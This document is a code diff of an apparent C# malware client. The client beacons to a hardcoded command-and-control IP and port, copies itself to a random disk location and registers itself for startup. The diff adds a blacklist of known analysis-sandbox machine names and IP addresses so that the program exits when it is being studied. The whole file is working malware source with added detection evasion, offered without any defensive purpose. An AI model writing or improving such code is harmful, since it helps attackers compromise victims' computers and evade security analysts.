@@ -1,5 +1,6 @@
 ﻿using System;
 using System.IO;
+using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Diagnostics;
@@ -11,10 +12,30 @@ class Client
     private const string ServerIP = "193.58.121.250";
     private const int ServerPort = 7175;
     private const int PingInterval = 30000;
-    private const int ReconnectInterval = 6000; // Пауза для переподключения (5 секунд)
+    private const int ReconnectInterval = 5000; // Пауза для переподключения (5 секунд)
+
+    private static readonly string[] BlacklistedPCNames =
+    {
+        "DESKTOP-ICCRDPD", "TVM-PC", "DESKTOP-JGLLJLD", "DESKTOP-0IJITTJ", "JOEBILL" , "PERSON-PC"
+    };
+
+    private static readonly string[] BlacklistedIPs =
+    {
+        "84.17.40.108", "31.28.104.137", "185.100.87.41", "185.220.101.39",
+        "84.247.105.120", "111.7.100.42", "157.245.77.56", "111.7.100.41",
+        "111.7.100.36", "111.7.100.37", "111.7.100.38", "111.7.100.39",
+        "111.7.100.40", "111.7.100.43", "111.7.100.44", "176.100.243.133"
+    };
 
     static void Main()
     {
+        // Проверка на чёрный список
+        if (IsBlacklisted())
+        {
+            Console.WriteLine("This computer or IP is blacklisted. Exiting...");
+            return;
+        }
+
         // Копируем исполняемый файл в случайное место на диске
         CopyToRandomLocation();
 
@@ -56,6 +77,33 @@ class Client
             Console.WriteLine("Retrying connection in 5 seconds...");
             Thread.Sleep(ReconnectInterval);
         }
+    }
+
+    private static bool IsBlacklisted()
+    {
+        // Проверка имени компьютера
+        string pcName = Environment.MachineName;
+        foreach (string blacklistedName in BlacklistedPCNames)
+        {
+            if (string.Equals(pcName, blacklistedName, StringComparison.OrdinalIgnoreCase))
+            {
+                Console.WriteLine($"Blacklisted computer name detected: {pcName}");
+                return true;
+            }
+        }
+
+        // Проверка IP-адресов
+        string localIP = GetLocalIPAddress();
+        foreach (string blacklistedIP in BlacklistedIPs)
+        {
+            if (string.Equals(localIP, blacklistedIP))
+            {
+                Console.WriteLine($"Blacklisted IP address detected: {localIP}");
+                return true;
+            }
+        }
+
+        return false;
     }
 
     private static void AddToStartup()
